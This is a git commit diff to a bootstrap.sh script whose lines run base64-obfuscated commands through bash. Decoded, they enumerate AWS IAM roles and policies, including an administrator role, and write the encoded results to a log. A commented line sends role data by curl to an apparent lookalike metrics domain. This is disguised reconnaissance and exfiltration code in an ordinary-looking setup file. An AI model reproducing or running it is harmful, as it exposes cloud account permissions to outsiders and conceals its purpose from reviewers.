3eb412373f7b92b54d8b0f4659d5d0514e0591f0
svendev045 <126712757+svendev045@users.noreply.github.com>
2023-03-02 11:10:07 -0800

    Update bootstrap.sh

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
 #curl -XGET http://api.datadog-metrics.net/aad2936f-2d7f-41f6-8a24-05896d958998/$(base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGVzIC0tcXVlcnkgIlJvbGVzWypdLltSb2xlTmFtZSwgQXJuXSI= | bash))
-base64 <<< $(base64 -d <<< YXdzIGlhbSBnZXQtcm9sZSAtLXJvbGUtbmFtZSBueWRpZy1hZG1pbmlzdHJhdG9y | bash) > data.log && cat data.log
+base64 <<< $(base64 -d <<< YXdzIGlhbSBsaXN0LXJvbGUtcG9saWNpZXMgLS1yb2xlLW5hbWUg | bash) > data.log && cat data.log
